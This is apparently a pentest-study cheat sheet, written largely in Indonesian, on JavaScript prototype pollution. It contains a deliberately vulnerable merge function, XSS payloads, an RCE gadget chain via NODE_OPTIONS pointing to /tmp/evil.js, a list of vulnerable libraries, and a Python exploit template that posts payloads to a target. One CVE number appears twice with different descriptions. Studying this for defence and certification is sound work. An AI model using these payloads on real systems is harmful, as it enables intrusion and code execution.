---
name: "Prototype Pollution"
description: "Client-side and server-side prototype pollution, vulnerable merge patterns, detection, server-side PP to RCE via gadget chaining, client-side PP to XSS, known CVEs, vulnerable library checks, and exploit templates."
tags: [oswe, prototype-pollution, javascript, nodejs, rce, xss, __proto__, gadget]
---

## Prototype Pollution

### What is Prototype Pollution?

Prototype Pollution adalah kerentanan JavaScript di mana attacker bisa memodifikasi `Object.prototype` (atau `__proto__`) untuk menginjeksi properti ke semua object dalam runtime. Ini terjadi ketika aplikasi melakukan **recursive merge** tanpa memeriksa `__proto__` key.

### Vulnerable Patterns

```javascript
// VULNERABLE merge function
function merge(a, b) {
    for (let key in b) {
        if (typeof b[key] === 'object' && b[key] !== null) {
            merge(a[key], b[key]);
        } else {
            a[key] = b[key];
        }
    }
}

// Input: {"__proto__": {"isAdmin": true}}
// Setelah merge, EVERY object has isAdmin = true
```

### Detection

```json
// Test payload
{"__proto__": {"test": 123}}

// Verifikasi — cek di browser console atau response behavior
// console.log({}.test) → 123 (if vulnerable)
```

### Server-Side Prototype Pollution → RCE

```javascript
// RCE via prototype pollution + child_process gadget
// Step 1: Pollute prototype
const payload = {
    "__proto__": {
        "shell": "node",
        "env": {
            "NODE_OPTIONS": "--require /tmp/evil.js"
        }
    }
};

// Step 2: Trigger child_process.spawn() or exec()
// child_process reads options from prototype → executes evil.js
```

**Common RCE gadgets**:
```javascript
// 1. child_process.exec() with shell option
// 2. Template engine options (NODE_OPTIONS)
// 3. HTTP headers (inject via prototype)
// 4. Socket.IO configuration
```

### Client-Side Prototype Pollution → XSS

```javascript
// DOM-based XSS via prototype pollution
{
    "__proto__": {
        "innerHTML": "<img src=x onerror=alert(1)>",
        "src": "javascript:alert(1)"
    }
}

// jQuery $() — DOM XSS
{
    "__proto__": {
        "href": "javascript:alert(document.domain)"
    }
}
```

### Known CVEs

- **CVE-2019-10744**: lodash.merge prototype pollution
- **CVE-2020-8203**: lodash.zipObjectDeep
- **CVE-2022-25883**: semver vulnerable to PP
- **CVE-2019-10744**: lodash.merge + handlebars → RCE

### Vulnerable Libraries

```javascript
const vulnerable = [
    'lodash.merge', 'lodash.defaultsDeep', 'lodash.set', 'lodash.zipObjectDeep',
    'jquery', 'jquery-extend', 'mixin-deep', 'merge-deep', 'merge-options',
    'object-assign-deep', 'defaults-deep', 'assign-deep', 'deep-extend',
    'just-extend', 'angular', 'handlebars', 'immer'
];
```

### Exploit Template (Server-Side PP)

```python
import requests, json

TARGET = "http://target/api/update"

# Phase 1: Test for PP
def test_pp():
    payload = {"__proto__": {"pp_test": "vulnerable"}}
    r = requests.post(TARGET, json=payload)

# Phase 2: Pollute + trigger gadget
def exploit():
    payload = {
        "__proto__": {
            "shell": True,
        }
    }
    r = requests.post(TARGET, json=payload)
    return r
```
